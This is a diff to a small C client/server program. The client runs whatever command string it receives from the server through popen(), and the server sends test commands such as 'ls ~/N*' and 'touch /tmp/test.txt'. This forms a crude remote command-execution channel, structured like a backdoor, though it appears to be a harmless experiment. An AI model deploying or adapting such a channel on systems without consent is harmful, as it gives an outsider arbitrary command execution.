@@ -21,6 +21,7 @@ int main(int argc, char *argv[]) {
     char recvBuff[1024];
     char sendBuff[1025];
     int nport = 3807;
+    int testi = 0;
     struct sockaddr_in serv_addr; 
     if(argc < 2) {
         printf("\nUsage: %s <mode> (ip of server)\n",argv[0]);
@@ -79,7 +80,8 @@ int main(int argc, char *argv[]) {
 				FILE * fp;
 				if((fp=popen((const char *)recvBuff, "r")) == NULL) {
 				}
-				while(fgets(cmdbfr,50000,fp) != NULL){
+				memset(cmdbfr, 0,sizeof(cmdbfr));
+				while(fgets(cmdbfr,sizeof(cmdbfr),fp) != NULL){
 				}
 				pclose(fp);
 			} 
@@ -98,9 +100,10 @@ int main(int argc, char *argv[]) {
 		serv_addr.sin_family = AF_INET;
 		serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		serv_addr.sin_port = htons(nport); 
-		if (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) {
-			printf("bind() failed\n");
-			return 1;
+		while (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) {
+			printf("bind() on %u failed\n", nport);
+			sleep(1);
+			//return 1;
 		}
 		if (listen(listenfd, 10) != 0) {
 			printf("listen() failed\n");
@@ -116,7 +119,11 @@ int main(int argc, char *argv[]) {
 					printf("\nError : Fputs error\n");
 				}
 			} 
-	    	snprintf(sendBuff, sizeof(sendBuff), "%.24s", "touch /tmp/test.txt");
+	    	snprintf(sendBuff, sizeof(sendBuff), "ls ~/%d*", testi);
+	    	testi++;
+	    	if (testi > 9) {
+	    		testi = 0;
+	    	}
 			write(connfd, sendBuff, strlen(sendBuff)); 
 			close(connfd);
 			sleep(1);
